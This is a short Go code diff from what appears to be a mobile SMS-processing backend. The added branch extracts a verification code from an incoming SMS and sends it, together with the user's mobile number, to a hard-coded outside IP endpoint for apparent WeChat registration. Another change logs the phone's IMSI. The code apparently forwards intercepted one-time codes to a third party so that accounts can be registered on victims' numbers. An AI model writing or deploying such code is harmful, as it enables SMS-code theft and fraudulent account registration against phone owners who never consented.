@@ -160,7 +160,18 @@ func processWechatRegister(msg string, user map[string]string, apid string) {
 		go send2Url(url)
 		go updateRelationSuccess(user, apid)
 	} else {
-		log.Println("processWechatRegister can not match:%s", msg)
+		exp = regexp.MustCompile(`码(\S*)。（`)
+		result = exp.FindStringSubmatch(msg)
+		if nil != result {
+			log.Println(result[1])
+			pwd := result[1]
+			mobile := formatMobile(user["mobile"])
+			url := "http://121.201.67.97:8080/verifycode/api/getWXChCode.jsp?cid=c115&pid=wxp109&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
+			go send2Url(url)
+			go updateRelationSuccess(user, apid)
+		} else {
+			log.Println("processWechatRegister can not match:%s", msg)
+		}
 	}
 }
 
@@ -342,7 +353,7 @@ func getC(w http.ResponseWriter, r *http.Request) {
 	infoLog := InfoRequest{Imsi: r.FormValue("imsi"), Ip: processIp(r.RemoteAddr), Cid: r.FormValue("cid"), Mobile: (*user)["mobile"], Resp: resp}
 	end := time.Now()
 	go logGetC(infoLog)
-	log.Println("getc total time(s):", end.Sub(start).Seconds())
+	log.Println("getc total time(s):", r.FormValue("imsi"), end.Sub(start).Seconds())
 }
 
 func procGetResp(resp string) string {
